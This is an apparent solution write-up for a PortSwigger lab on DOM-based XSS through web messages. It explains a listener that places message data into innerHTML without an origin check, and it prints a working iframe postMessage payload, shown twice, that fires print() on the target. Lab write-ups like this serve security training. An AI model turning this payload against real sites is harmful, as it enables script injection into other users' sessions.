# Lab: DOM XSS using web messages (Practitioner)

**Lab:** [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

**Task (from PortSwigger):**  
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

## Vulnerability
The home page registers an `addEventListener` for web messages and inserts the message content into a `div` with `innerHTML` (no origin check).

## Solution

Exploit server body:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### Steps
1. Inspect the home page JS — event listener accepts any origin (`*`) and sinks message data into HTML.
2. Host the iframe on the exploit server; on load it posts an `img` with `onerror=print()`.
3. Store and **Deliver exploit to victim**.

## Final Exploit Payload
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
